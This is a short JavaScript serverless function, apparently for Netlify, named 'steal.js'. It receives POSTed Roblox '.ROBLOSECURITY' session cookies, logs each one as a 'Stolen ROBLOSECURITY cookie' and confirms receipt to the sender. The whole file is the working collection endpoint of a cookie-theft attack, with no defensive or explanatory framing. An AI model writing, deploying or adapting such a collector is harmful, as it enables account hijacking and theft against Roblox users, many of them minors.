// netlify/functions/steal.js
exports.handler = async (event, context) => {
    // Ensure it's a POST request
    if (event.httpMethod === 'POST') {
        try {
            const data = JSON.parse(event.body);  // Parse the POST body
            const stolenCookie = data.roblox_cookie;  // Extract the stolen cookie

            console.log('Stolen ROBLOSECURITY cookie:', stolenCookie);  // Log the stolen cookie

            return {
                statusCode: 200,
                body: JSON.stringify({ message: 'Cookie received!' })
            };
        } catch (error) {
            console.error('Error processing the request:', error);
            return {
                statusCode: 500,
                body: JSON.stringify({ message: 'Error processing request' })
            };
        }
    } else {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method Not Allowed' })
        };
    }
};

